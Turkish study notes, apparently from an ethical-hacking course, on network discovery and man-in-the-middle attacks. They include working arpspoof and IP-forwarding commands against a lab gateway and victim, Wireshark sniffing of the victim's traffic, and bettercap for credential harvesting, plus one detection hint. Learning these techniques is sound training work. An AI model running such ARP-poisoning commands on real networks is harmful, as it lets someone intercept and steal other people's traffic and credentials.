### Bağlantı Sonrası Yapılacaklar

**_ Netdiscover _**
-Mac adresleri ve ip adreslerini gösteren tablo çıkarır

~ifconfig //ip adresini öğren (bağlı olduğun ağın ya da kırdığın ağın)

~netdiscover -i eth0 -r 10.0.2.0/24 -c 10 // eth0=adı ,, 0/24 bu aralıktaki ağlar ,, 10 ne kadar istek atılacağı

**_ nmap _**

~nmap 10.0.2.0/24 //aynı sonucu verir

////////

**_ Port _**
-Her veri belirli portlardan sağlanır. Her servisin kendine has portu vardır.
Örn: 80 portu Http , 443 portu Https (Web sitesi açmak için)

////////

**_ MITM (Man-in-the-Middle) Saldırısı (Ortadaki Adam) _**

-Hacker bilgisayar kendini ortaya konumlandırır. Kurban, tüm verileri hackera yollar (çünkü onu modem sanıyor). Hacker da bu verileri modeme yollar (çünkü trafiğin devam etmesini istiyor). Arada durup, tüm verileri okuyabilir, değiştirebilir veya kaydedebilir.

**_ ARP (Address Resolution Protocol) (Adres Çözümleme Protokolü) Açığı _**
--Bir bilgisayar, bir IP adresine veri göndermek isterse önce o IP’ye ait MAC adresini öğrenmek için ağa ARP isteği (Who has?) yollar.Kurbana:
“Modemin IP’si şu, ama MAC adresi benim” der.Modeme de:
“Kurbanın IP’si şu, ama MAC adresi benim” der.

**_ ARP Poison _**

~netdiscover -i eth0 -r 10.0.2.0/24 -c 10 //mac ip adres öğren

~echo 1 > /proc/sys/net/ipv4/ip_forward //Normalde bir bilgisayar, gelen IP paketlerini sadece kendisine yönlendirilmişse işler. Ancak bu komut sayesinde o bilgisayar, gelen IP paketlerini başka bir cihaza yönlendirebilir hale gelir. Yani, bilgisayar bir router (yönlendirici) gibi davranır.

~arpspoof -i eth0 -t 10.0.2.6 10.0.2.1 //saldırı
~arpspoof -i eth0 -t 10.0.2.1 10.0.2.6 //2 terminalle hem modeme hem

~arp -a //saldırılan bilgisayar da bu komutu çalıştırdığında aynı mac adresine sahip iki cihaz görürsen saldırıya uğruyorsun

**_ Wireshark _**
--Wireshark, ağ trafiğini gerçek zamanlı olarak izlemek ve analiz etmek için kullanılan güçlü bir ağ analiz aracıdır.Ağa gelen ve giden tüm veri paketlerini görüntüler.Paketlerin içeriğini analiz eder (örneğin: IP, TCP, HTTP, DNS, vs.).Ağ sorunlarını tespit etmeye yardımcı olur. Güvenlik açıklarını incelemek için kullanılır (örneğin: şifrelenmemiş veriler, şüpheli bağlantılar).MITM gibi saldırılarda kurbanın verilerini görmek için kullanılır.

**_ Spoofing _**

Spoofing, Türkçede “aldatma”, “kimliğe bürünme” veya “sahtecilik” anlamına gelir ve siber güvenlikte bir sistemin, cihazın ya da kişinin kimliğini taklit ederek yapılan saldırılara verilen genel isimdir.

**_ Wireshark Saldırı İnceleme _**

~echo 1 > /proc/sys/net/ipv4/ip_forward
~arpspoof -i eth0 -t 10.0.2.6 10.0.2.1 //saldırı
~arpspoof -i eth0 -t 10.0.2.1 10.0.2.6 //2 terminalle, hem modeme hem cihaz

wireshark aç ve hareketleri incele saldırdığın cihazın

**_ Bettercap _**
Aktif bir saldırı aracıdır. MITM saldırıları, DNS spoofing, credential harvesting gibi saldırgan işlemleri yapabilir. CLI (komut satırı) üzerinden çalışır. Ağ üzerindeki diğer cihazları hedef alabilir. Paketleri değiştirebilir, yönlendirebilir.

~bettercap -iface eth0
~help //açıldıktan sonra yazarsan neler yapabidiğini gör
